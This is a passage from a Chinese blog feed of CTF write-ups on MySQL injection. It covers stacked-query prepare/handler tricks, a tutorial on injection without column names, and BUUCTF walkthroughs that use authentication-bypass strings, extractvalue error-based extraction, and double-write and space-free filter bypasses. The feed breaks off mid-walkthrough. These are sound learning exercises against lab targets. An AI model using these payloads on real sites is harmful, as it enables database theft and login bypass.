&lt;p&gt;flag 在这里，但是显示不出来 flag，很尴尬，于是学会了两个方法，&lt;/p&gt;
&lt;p&gt;第一种比较常规，第二种比较万能。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;第一种：预编译&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;因为 select 被 ban 了，可以考虑 &lt;strong&gt;16 进制编码&lt;/strong&gt;绕过，也可以考虑&lt;strong&gt;拼接语句&lt;/strong&gt;绕过，我用了拼接语句。&lt;/p&gt;
&lt;p&gt;先构造语句&lt;/p&gt;
&lt;figure class=&#34;highlight sql&#34;&gt;&lt;figcaption data-lang=&#34;SQL&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;select&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;*&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;from&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;`&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1919810931114514&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;`&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;进行预编译：&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-mysql&#34;&gt;1&#39;; SET @a= concat(&#39;sel&#39;,&#39;ect&#39;,&#39;* from `1919810931114514`&#39;); prepare flag from @a; execute flag;#
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;注释一下：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;定义：    SET @变量 = 语句（命令）&lt;/li&gt;
&lt;li&gt;预编译：   prepare name from 语句&lt;/li&gt;
&lt;li&gt;执行：   excute name&lt;/li&gt;
&lt;/ol&gt;
&lt;hr&gt;
&lt;p&gt;&lt;strong&gt;第二种：handler 方法&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;MySQL 除了可以使用 select 查询表中的数据，也可使用 handler 语句，这条语句使我们能够一行一行的浏览一个表中的数据，不过 handler 语句并不具备 select 语句的所有功能。它是 MySQL 专用的语句，并没有包含到 SQL 标准中。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;此处需要用到的语法：&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&amp;lt;img src=&amp;quot;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjEvMDgvMDEvdkxGaDllTXFhNkRDOE9XLnBuZw==&#34;&gt;https://i.loli.net/2021/08/01/vLFh9eMqa6DC8OW.png&lt;/span&gt;&amp;quot; alt=&amp;quot;1.5.png&amp;quot; style=&amp;quot;zoom:50%;&amp;quot; /&amp;gt;&amp;lt;!--p5--&amp;gt;&lt;/p&gt;
&lt;p&gt;构造 payload：&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-mysql&#34;&gt;1&#39;; handler `1919810931114514` open as a; handler a read first;#
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;随便哪个 payload 都可得到 flag：&lt;/p&gt;
&lt;p&gt;&amp;lt;img src=&amp;quot;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjEvMDgvMDEvdUxleHI1cDYzQ1VzUW13LnBuZw==&#34;&gt;https://i.loli.net/2021/08/01/uLexr5p63CUsQmw.png&lt;/span&gt;&amp;quot; alt=&amp;quot;1.6.png&amp;quot; style=&amp;quot;zoom:50%;&amp;quot; /&amp;gt;&amp;lt;!--p6--&amp;gt;&lt;/p&gt;
&lt;p&gt;另外本题还能通过改名和 mysql 约束去做，感觉太麻烦了，没学。。&lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;后面遇到堆叠注入和预编译的题再补上，就这样&lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;END&lt;/p&gt;
</content>
        <category term="sql" />
        <updated>2021-08-01T07:01:31.153Z</updated>
    </entry>
    <entry>
        <id>http://imfanqie.top/2021/06/21/ctf/web/sql/ctfweb-sql%E6%97%A0%E5%88%97%E5%90%8D%E6%B3%A8%E5%85%A5/</id>
        <title>ctfweb-sql无列名注入</title>
        <link rel="alternate" href="http://imfanqie.top/2021/06/21/ctf/web/sql/ctfweb-sql%E6%97%A0%E5%88%97%E5%90%8D%E6%B3%A8%E5%85%A5/"/>
        <content type="html">&lt;p&gt;谈谈 sql 注入无列名的情况&lt;/p&gt;
&lt;p&gt;以及该如何解题&lt;/p&gt;
&lt;p&gt;&lt;span id=&#34;more&#34;&gt;&lt;/span&gt;&lt;/p&gt;
&lt;h1 id=&#34;无列名注入&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#无列名注入&#34;&gt;#&lt;/a&gt; &lt;em&gt;&lt;strong&gt;无列名注入&lt;/strong&gt;&lt;/em&gt;&lt;/h1&gt;
&lt;p&gt;顾名思义，就是在不知道列名的情况下进行 sql 注入。&lt;/p&gt;
&lt;p&gt;在大多数 CTF 题目中， &lt;code&gt;information_schema&lt;/code&gt;  库被过滤，称为无列名注入。&lt;/p&gt;
&lt;h1 id=&#34;方法总结&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#方法总结&#34;&gt;#&lt;/a&gt; 方法总结&lt;/h1&gt;
&lt;h3 id=&#34;基于union-select的无列名注入&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#基于union-select的无列名注入&#34;&gt;#&lt;/a&gt; &lt;em&gt;基于 union select 的无列名注入&lt;/em&gt;&lt;/h3&gt;
&lt;hr&gt;
&lt;p&gt;一般 sql 查询：&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-mysql&#34;&gt;select * from admin
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;假设得到列名 id,name,password，则使用联合查询 union：&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-mysql&#34;&gt;select 1,2,3 union select * from admin
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;则，数字会替换成列名（联合查询的特性，拼接表），所以 1,2,3 分别对应了 id，name，password&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-mysql&#34;&gt;select b from (select 1,2,3 as b union select * from admin)a
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;（b 是 3 的重命名，a 是任意字符，用于命名）&lt;/p&gt;
&lt;p&gt;如果需要查多个列，用 concat () 函数即可。&lt;/p&gt;
&lt;p&gt;order by  用不了的情况下，可以用 group by 代替。&lt;/p&gt;
&lt;h3 id=&#34;基于join的无列名注入的场景与方法&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#基于join的无列名注入的场景与方法&#34;&gt;#&lt;/a&gt; 基于 join 的无列名注入的场景与方法&lt;/h3&gt;
&lt;hr&gt;
&lt;p&gt;join 后的列名是两个表列名加起来的，可能会产⽣相同的列名，如 id 和 name，使⽤别名时，表中不能出现同的字段名，这就跟 join 第⼀个特点相冲突，所以在 join 和别名同时使⽤时会导致报错。&lt;/p&gt;
&lt;p&gt;当通过查询得到新的表时，必须有一个别名，即每个派生出来的表都必须有一个自己的别名。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;首先获取第一个列名&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-mysql&#34;&gt;?id=-1&#39; union all select * from (select * from users as a join users as b)as c
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;as 主要作用是起别名，就是把 users 表当做 a 表，常规来说 as 可以省略&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;获取接下来的列名&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-mysql&#34;&gt;?id=-1&#39; union all select*from (select * from users as a join users as b using(id,username))a
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;利用sysschema_auto_increment_columns-库来进行查询&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#利用sysschema_auto_increment_columns-库来进行查询&#34;&gt;#&lt;/a&gt; 利用 sys.schema_auto_increment_columns 库来进行查询&lt;/h3&gt;
&lt;hr&gt;
&lt;p&gt;由于 performance_schema 过于发杂，所以 mysql 在 5.7 版本中新增了 sys schemma，基础数据来自于 performance_chema 和 information_schema 两个库，本身数据库不存储数据&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;mysql 默认是关闭 InnoDB 存储引擎的&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;注入中在 mysql 默认情况下就可以替代 information_schema 库的方法&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;payload:&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;em&gt;获取库名：&lt;/em&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-mysql&#34;&gt;schema_auto_increment_columns 
?id=-1&#39; union all select 1,2,group_concat(table_name)from sys.schema_auto_increment_columns where table_schema=database()--+
&lt;/code&gt;&lt;/pre&gt;
&lt;pre&gt;&lt;code class=&#34;language-mysql&#34;&gt;schema_table_statistics_with_buffer 
?id=-1&#39; union all select 1,2,group_concat(table_name)from sys.schema_table_statistics_with_buffer where table_schema=database()--+
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;strong&gt;限制&lt;/strong&gt;：一般要超级管理员才可以访问 sys&lt;/p&gt;
&lt;p&gt;​			mysql ≥ 5.7 版本&lt;/p&gt;
&lt;p&gt;&lt;em&gt;获取字段名：&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;用 join 方法或者无列名注入。&lt;/p&gt;
&lt;h3 id=&#34;利用-innodb-中的库进行查询&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#利用-innodb-中的库进行查询&#34;&gt;#&lt;/a&gt; 利用 innodb 中的库进行查询&lt;/h3&gt;
&lt;hr&gt;
&lt;p&gt;innodb_table_stats 存放库名&lt;/p&gt;
&lt;p&gt;innodb_table_index 存放表名&lt;/p&gt;
&lt;p&gt;使用方法同正常 sql 注入：&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-mysql&#34;&gt;select table_name from mysql.innodb_table_stats where database_name=库名xxx
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;** 限制：** 表引擎为 innodb&lt;/p&gt;
&lt;p&gt;​			mysql &amp;gt; 5.5&lt;/p&gt;
&lt;h3 id=&#34;通过报错来达到无列名查询目的&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#通过报错来达到无列名查询目的&#34;&gt;#&lt;/a&gt; 通过报错来达到无列名查询目的&lt;/h3&gt;
&lt;hr&gt;
&lt;p&gt;爆库名：&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-mysql&#34;&gt;select 1,2,3 from users where 1=abc();
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;爆表名：&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-mysql&#34;&gt;select 1,2,3 from users where Polygon(id);
select 1,2,3 from users where linestring(id);
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;爆列名：&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-mysql&#34;&gt;select 1,2,3 from users where (select*from (select*from users as a join users as b)as c);
&lt;/code&gt;&lt;/pre&gt;
&lt;pre&gt;&lt;code class=&#34;language-mysql&#34;&gt;select 1,2,3 from users where (select*from (select*from users as a join users as b using (id))as c);
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;前提是 users 表存在&lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;END&lt;/p&gt;
</content>
        <category term="sql" />
        <updated>2021-06-20T17:04:45.964Z</updated>
    </entry>
    <entry>
        <id>http://imfanqie.top/2021/06/20/ctf/web/sql/(ctfwp)sql%E6%B3%A8%E5%85%A5%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/</id>
        <title>(ctfwp)sql注入极客大挑战</title>
        <link rel="alternate" href="http://imfanqie.top/2021/06/20/ctf/web/sql/(ctfwp)sql%E6%B3%A8%E5%85%A5%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/"/>
        <content type="html">&lt;p&gt;buuctf 极客大挑战系列    &lt;em&gt;&lt;strong&gt;sql 注入&lt;/strong&gt;&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;&lt;span id=&#34;more&#34;&gt;&lt;/span&gt;&lt;/p&gt;
&lt;h1 id=&#34;no1-easysql&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#no1-easysql&#34;&gt;#&lt;/a&gt; NO.1 EasySQL&lt;/h1&gt;
&lt;p&gt;题目如图：&lt;/p&gt;
&lt;p&gt;&amp;lt;img src=&amp;quot;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjEvMDYvMjEvV3BZSzJFZmczQWRSam1RLnBuZw==&#34;&gt;https://i.loli.net/2021/06/21/WpYK2Efg3AdRjmQ.png&lt;/span&gt;&amp;quot; alt=&amp;quot;easysql1&amp;quot; style=&amp;quot;zoom: 25%;&amp;quot; /&amp;gt;&lt;/p&gt;
&lt;p&gt;先尝试 万能密码&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;&#39; or 1=1 #
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;结果一步得出答案...&lt;/p&gt;
&lt;p&gt;&amp;lt;img src=&amp;quot;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjEvMDYvMjEvZGJ5RmZ1Tm0yendha3JSLnBuZw==&#34;&gt;https://i.loli.net/2021/06/21/dbyFfuNm2zwakrR.png&lt;/span&gt;&amp;quot; alt=&amp;quot;easysql2&amp;quot; style=&amp;quot;zoom:25%;&amp;quot; /&amp;gt;&lt;/p&gt;
&lt;h1 id=&#34;no2-lovesql&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#no2-lovesql&#34;&gt;#&lt;/a&gt; NO.2 LoveSQL&lt;/h1&gt;
&lt;p&gt;题目同上，没变化&lt;/p&gt;
&lt;p&gt;尝试万能密码，找不到有效信息&lt;/p&gt;
&lt;p&gt;&amp;lt;img src=&amp;quot;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjEvMDYvMjEvbjQ4TFVHMWs2b3hWbFFaLnBuZw==&#34;&gt;https://i.loli.net/2021/06/21/n48LUG1k6oxVlQZ.png&lt;/span&gt;&amp;quot; alt=&amp;quot;love1&amp;quot; style=&amp;quot;zoom:25%;&amp;quot; /&amp;gt;&lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;尝试报错注入，寻找其他库 / 表：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;1&#39;and extractvalue(1,concat(&#39;~&#39;,database()))#
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;顺利得到库名  geek&lt;/p&gt;
&lt;p&gt;&amp;lt;img src=&amp;quot;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjEvMDYvMjEvZHhpYVhGUXFCNmNvcFo4LnBuZw==&#34;&gt;https://i.loli.net/2021/06/21/dxiaXFQqB6copZ8.png&lt;/span&gt;&amp;quot; alt=&amp;quot;love2&amp;quot; style=&amp;quot;zoom:25%;&amp;quot; /&amp;gt;&lt;/p&gt;
&lt;p&gt;尝试爆表名：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;1&#39;and extractvalue(1,concat(&#39;~&#39;,(select table_name from information_schema.tables where table_schema=&amp;quot;geek&amp;quot;)))#
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;显示 结果超过一行（&lt;em&gt;Subquery returns more than 1 row&lt;/em&gt;），添加 group_connat ()  函数解决。&lt;/p&gt;
&lt;p&gt;所以，输入&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;1&#39;and extractvalue(1,concat(&#39;~&#39;,(select group_concat(table_name) from information_schema.tables where table_schema=&amp;quot;geek&amp;quot;)))#
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;得到表名 geekuser,l0ve1ysq1&lt;/p&gt;
&lt;p&gt;&amp;lt;img src=&amp;quot;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjEvMDYvMjEvb3Z1ZVB0YnNjR2sxNThqLnBuZw==&#34;&gt;https://i.loli.net/2021/06/21/ovuePtbscGk158j.png&lt;/span&gt;&amp;quot; alt=&amp;quot;love3&amp;quot; style=&amp;quot;zoom:25%;&amp;quot; /&amp;gt;&lt;/p&gt;
&lt;p&gt;尝试查表名，目测是第二个&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;1&#39;and extractvalue(1,concat(&#39;~&#39;,(select group_concat(column_name) from information_schema.columns where table_name=&amp;quot;l0ve1ysq1&amp;quot;)))#
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;得到列名 id,username,password&lt;/p&gt;
&lt;p&gt;&amp;lt;img src=&amp;quot;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjEvMDYvMjEvbXZOWVFNR29MT0E1cDFaLnBuZw==&#34;&gt;https://i.loli.net/2021/06/21/mvNYQMGoLOA5p1Z.png&lt;/span&gt;&amp;quot; alt=&amp;quot;love4&amp;quot; style=&amp;quot;zoom:25%;&amp;quot; /&amp;gt;&lt;/p&gt;
&lt;p&gt;尝试获取信息&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;1&#39;and extractvalue(1,concat(&#39;~&#39;,(select concat_ws(&#39;~&#39;,id,username,password) from l0ve1ysq1 where id=1)))#
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&amp;lt;img src=&amp;quot;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjEvMDYvMjEvQWd3Yk9WYW01Y0I5RkwyLnBuZw==&#34;&gt;https://i.loli.net/2021/06/21/AgwbOVam5cB9FL2.png&lt;/span&gt;&amp;quot; alt=&amp;quot;love5&amp;quot; style=&amp;quot;zoom:25%;&amp;quot; /&amp;gt;&lt;/p&gt;
&lt;p&gt;又查了几个 id 全是废话，直接爆破吧&lt;/p&gt;
&lt;p&gt;&amp;lt;img src=&amp;quot;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjEvMDYvMjEvVmgyakdBMWxYOEJiY3JhLnBuZw==&#34;&gt;https://i.loli.net/2021/06/21/Vh2jGA1lX8Bbcra.png&lt;/span&gt;&amp;quot; alt=&amp;quot;love6&amp;quot; style=&amp;quot;zoom:25%;&amp;quot; /&amp;gt;&lt;/p&gt;
&lt;p&gt;&amp;lt;img src=&amp;quot;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjEvMDYvMjEvWUVENkxiNzhlcW5sazNQLnBuZw==&#34;&gt;https://i.loli.net/2021/06/21/YED6Lb78eqnlk3P.png&lt;/span&gt;&amp;quot; alt=&amp;quot;love7&amp;quot; style=&amp;quot;zoom:25%;&amp;quot; /&amp;gt;&lt;/p&gt;
&lt;p&gt;爆破得出 id=16 处有 flag 没显示全&lt;/p&gt;
&lt;p&gt;前半段&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;1&#39;and extractvalue(1,concat(&#39;~&#39;,(select concat_ws(&#39;~&#39;,id,username,password) from l0ve1ysq1 where id=16)))#
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;后半段&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;1&#39;and extractvalue(1,concat(&#39;~&#39;,(select substr(password,15,30) from l0ve1ysq1 where id=16)))#
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&amp;lt;img src=&amp;quot;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjEvMDYvMjEvUlhoZlUycjhkN0dTNUNKLnBuZw==&#34;&gt;https://i.loli.net/2021/06/21/RXhfU2r8d7GS5CJ.png&lt;/span&gt;&amp;quot; alt=&amp;quot;love8&amp;quot; style=&amp;quot;zoom:25%;&amp;quot; /&amp;gt;&lt;/p&gt;
&lt;p&gt;&amp;lt;img src=&amp;quot;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjEvMDYvMjEvZkU2OEZ2WVhuUndWSE91LnBuZw==&#34;&gt;https://i.loli.net/2021/06/21/fE68FvYXnRwVHOu.png&lt;/span&gt;&amp;quot; alt=&amp;quot;love9&amp;quot; style=&amp;quot;zoom:25%;&amp;quot; /&amp;gt;&lt;/p&gt;
&lt;p fd752c8f-8f92-4b6f-93fa-0f99791741f0&gt;得  flag&lt;/p&gt;
&lt;h1 id=&#34;no3-babysql&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#no3-babysql&#34;&gt;#&lt;/a&gt; NO.3 BabySQL&lt;/h1&gt;
&lt;p&gt;老方法 万能密码走一遍，果然不行～&lt;/p&gt;
&lt;p&gt;选择做 FUZZ 模糊测试&lt;/p&gt;
&lt;p&gt;&amp;lt;img src=&amp;quot;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjEvMDYvMjEvNVFjTzRDWkduYjM4MjdyLnBuZw==&#34;&gt;https://i.loli.net/2021/06/21/5QcO4CZGnb3827r.png&lt;/span&gt;&amp;quot; alt=&amp;quot;baby1&amp;quot; style=&amp;quot;zoom: 33%;&amp;quot; /&amp;gt;&lt;/p&gt;
&lt;p&gt;不难发现 len 726 长度都被过滤成空 &#39;&#39;  所以显示没有输入，&lt;/p&gt;
&lt;p&gt;而 len 751 都没有被过滤，&lt;/p&gt;
&lt;p&gt;这种过滤比较简单，所以直接考虑 &lt;strong&gt;双写绕过&lt;/strong&gt;。&lt;/p&gt;
&lt;p&gt;通过报错注入&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;1&#39;oorr extractvalue(1,concat(0x7e,database()))#
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;得到库名 geek&lt;/p&gt;
&lt;p&gt;&amp;lt;img src=&amp;quot;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjEvMDYvMjEvRXdTM296VEY4Nk1DUGxYLnBuZw==&#34;&gt;https://i.loli.net/2021/06/21/EwS3ozTF86MCPlX.png&lt;/span&gt;&amp;quot; alt=&amp;quot;baby2&amp;quot; style=&amp;quot;zoom:25%;&amp;quot; /&amp;gt;&lt;/p&gt;
&lt;p&gt;继续爆表名&lt;/p&gt;
&lt;pre&gt;&lt;code&gt; **1&#39;oorr extractvalue(1,concat(0x7e,(seselectlect group_concat(table_name)frfromom infoorrmation_schema.tables whwhereere table_schema=&amp;quot;geek&amp;quot;)))#**     
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;得到表名 b4bsql,geekuser&lt;/p&gt;
&lt;p&gt;&amp;lt;img src=&amp;quot;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjEvMDYvMjEvUVJBdEwxQjlZNEhUemVDLnBuZw==&#34;&gt;https://i.loli.net/2021/06/21/QRAtL1B9Y4HTzeC.png&lt;/span&gt;&amp;quot; alt=&amp;quot;baby3&amp;quot; style=&amp;quot;zoom:25%;&amp;quot; /&amp;gt;&lt;/p&gt;
&lt;p&gt;继续爆列名&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;1&#39;oorr extractvalue(1,concat(0x7e,(seselectlect group_concat(column_name)frfromom infoorrmation_schema.columns whwhereere table_name=&amp;quot;b4bsql&amp;quot;)))#
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;得到列名 id,username,password&lt;/p&gt;
&lt;p&gt;&amp;lt;img src=&amp;quot;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjEvMDYvMjEvaUpybmM4czFaQzlEbU9FLnBuZw==&#34;&gt;https://i.loli.net/2021/06/21/iJrnc8s1ZC9DmOE.png&lt;/span&gt;&amp;quot; alt=&amp;quot;baby4&amp;quot; style=&amp;quot;zoom:25%;&amp;quot; /&amp;gt;&lt;/p&gt;
&lt;p&gt;查询数据&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;1&#39;oorr extractvalue(1,concat(0x7e,(seselectlect concat_ws(0x7e,id,username,passwoorrd)frfromom b4bsql whwhereere id=1)))#
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;同上，又是一堆废话，直接爆破，得到 id=8 时有 flag&lt;/p&gt;
&lt;p&gt;剩下步骤同上一题&lt;/p&gt;
&lt;p&gt;&amp;lt;img src=&amp;quot;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjEvMDYvMjEvaG10WHY3anFuSFdaRXlELnBuZw==&#34;&gt;https://i.loli.net/2021/06/21/hmtXv7jqnHWZEyD.png&lt;/span&gt;&amp;quot; alt=&amp;quot;baby5&amp;quot; style=&amp;quot;zoom:33%;&amp;quot; /&amp;gt;&lt;/p&gt;
&lt;p&gt;后半部分&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;1&#39;oorr extractvalue(1,concat(0x7e,(seselectlect subsubstrstr(passwoorrd,15,30)frfromom b4bsql whwhereere id=8)))#
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&amp;lt;img src=&amp;quot;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjEvMDYvMjEva3dUaDRFOUlvY1ZRbmpxLnBuZw==&#34;&gt;https://i.loli.net/2021/06/21/kwTh4E9IocVQnjq.png&lt;/span&gt;&amp;quot; alt=&amp;quot;baby6&amp;quot; style=&amp;quot;zoom:25%;&amp;quot; /&amp;gt;&lt;/p&gt;
&lt;p 50ba0844-d76f-4a9a-892f-bc7694528c7e&gt;得 flag&lt;/p&gt;
&lt;h1 id=&#34;no4-hardsql&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#no4-hardsql&#34;&gt;#&lt;/a&gt; NO.4 HardSQL&lt;/h1&gt;
&lt;p&gt;万能密码走一下，失败&lt;/p&gt;
&lt;p&gt;&amp;lt;img src=&amp;quot;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjEvMDYvMjEvMXVqZUdjRno0bnJ2OWw4LnBuZw==&#34;&gt;https://i.loli.net/2021/06/21/1ujeGcFz4nrv9l8.png&lt;/span&gt;&amp;quot; alt=&amp;quot;hard1&amp;quot; style=&amp;quot;zoom:25%;&amp;quot; /&amp;gt;&lt;/p&gt;
&lt;p&gt;直接做 FUZZ 模糊测试&lt;/p&gt;
&lt;p&gt;&amp;lt;img src=&amp;quot;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjEvMDYvMjEvYU9XSXRmeDZpWFBLQkxrLnBuZw==&#34;&gt;https://i.loli.net/2021/06/21/aOWItfx6iXPKBLk.png&lt;/span&gt;&amp;quot; alt=&amp;quot;hard2&amp;quot; style=&amp;quot;zoom: 33%;&amp;quot; /&amp;gt;&lt;/p&gt;
&lt;p&gt;如图，len 736 都被屏蔽了&lt;/p&gt;
&lt;p&gt;len 751 没被屏蔽，另外空格在实际输入中也被屏蔽了，所以空格用括号代替。&lt;/p&gt;
&lt;p&gt;尝试报错注入 **1&#39;or (extractvalue (1,concat (0x7e,database ())))#&lt;/p&gt;
&lt;p&gt;顺利得到库名  geek&lt;/p&gt;
&lt;p&gt;图同上，略&lt;/p&gt;
&lt;p&gt;尝试爆表名&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;1&#39;or(extractvalue(1,concat(0x7e,(select(table_name)from(information_schema.tables)where((table_schema)like(&amp;quot;geek&amp;quot;))))))#
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&amp;lt;img src=&amp;quot;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjEvMDYvMjEvQ1FpRUx1TXo3anRGMnNvLnBuZw==&#34;&gt;https://i.loli.net/2021/06/21/CQiELuMz7jtF2so.png&lt;/span&gt;&amp;quot; alt=&amp;quot;hard3&amp;quot; style=&amp;quot;zoom:25%;&amp;quot; /&amp;gt;&lt;/p&gt;
&lt;p&gt;得到表名 H4rDsq1&lt;/p&gt;
&lt;p&gt;尝试爆列名&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;1&#39;or(extractvalue(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where((table_name)like(&amp;quot;H4rDsq1&amp;quot;))))))#
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;得 id,username,password&lt;/p&gt;
&lt;p&gt;&amp;lt;img src=&amp;quot;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjEvMDYvMjEvaHROYVVCeFlSQ3dsYmpBLnBuZw==&#34;&gt;https://i.loli.net/2021/06/21/htNaUBxYRCwlbjA.png&lt;/span&gt;&amp;quot; alt=&amp;quot;hard4&amp;quot; style=&amp;quot;zoom:25%;&amp;quot; /&amp;gt;&lt;/p&gt;
&lt;p&gt;查找信息&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;1&#39;or(extractvalue(1,concat(0x7e,(select(password)from(H4rDsq1)where((id)like(1))))))#
&lt;/code&gt;&lt;/pre&gt;
